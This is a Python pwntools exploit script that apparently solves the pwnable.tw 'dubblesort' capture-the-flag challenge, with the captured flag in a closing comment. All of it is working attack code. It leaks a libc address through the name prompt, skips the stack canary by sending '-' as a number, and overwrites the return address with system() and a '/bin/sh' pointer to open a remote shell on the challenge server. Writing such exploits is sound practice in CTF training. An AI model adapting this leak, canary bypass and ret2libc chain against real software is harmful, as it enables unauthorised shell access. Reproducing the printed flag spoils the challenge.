#!/usr/bin/env python3

from pwn import *

exe = ELF("./dubblesort_patched", checksec=False)
libc = ELF("./libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = connect("chall.pwnable.tw", 10101)

    return r


def main():
    r = conn()
    input()
    # good luck pwning :)
    # Leaking libc address on remote. In local, it should be 24 for padding and 28 in remote
    r.sendlineafter(b'name :', b'A'*28)
    pause()
    r.recvuntil(b'A'*28)
    libc_leak = u32(r.recv(4))
    info('Libc leak: ' + hex(libc_leak))
    libc.address = libc_leak - 0x1b000a
    ret_system = libc.sym['system']
    ret_binsh = next(libc.search('/bin/sh'))
    info('Libc address: ' + hex(libc.address))
    info('system: ' + hex(ret_system))
    info('Binsh: ' + hex(ret_binsh))
    pause()
    r.sendlineafter(b'sort :', b'35')
    for i in range(35):
        payload = b''
        # canary = $ebp-0x10, number = $ebp-70 so offset will be 25
        if i < 24:
            payload = b'1'
        elif i == 24:
            payload = b'-'      #Bypass canary
        elif i < 33:
            payload = str(ret_system).encode()  # Set return address to system
        else: 
            payload = str(ret_binsh).encode()   # Set return address to binsh and argument of system()
        info(b'Payload: ' + payload)
        r.sendlineafter(b'number : ', payload) 
        # if i == 24: 
        #     pause()
    pause()   
    r.interactive()


if __name__ == "__main__":
    main()
#FLAG{Dubo_duBo_dub0_s0rttttttt}